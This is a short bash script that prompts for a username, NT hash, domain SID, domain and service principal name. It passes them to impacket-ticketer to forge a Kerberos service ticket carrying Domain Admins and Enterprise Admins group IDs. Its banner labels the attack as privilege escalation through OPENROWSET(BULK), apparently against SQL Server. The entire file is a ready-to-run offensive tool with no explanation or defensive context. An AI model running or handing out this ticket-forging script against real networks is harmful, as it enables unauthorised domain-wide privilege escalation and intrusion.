#!/bin/bash
BOLD="\033[1m"
RED="\033[31m"
RESET="\033[0m"
BLUE="\033[32m"

echo -e "${BOLD}${RED}wow ! Self Signed Ticket ---<${RESET}"
echo " "
echo -e "${BOLD}${BLUE}Privileges Escalation attack:- OPENROWSET(BULK) ${RESET}"

echo "username:-"
read username
 
echo "NTHASH:-"
read nthash

echo "Domain SID:-"
read sid

echo "Domain:-"
read domain

echo "spn (service principle name):-"
read spn

impacket-ticketer -nthash $nthash -domain-sid $sid  -domain $domain -spn $spn -groups 512,519,1105 -user-id 1103  $username
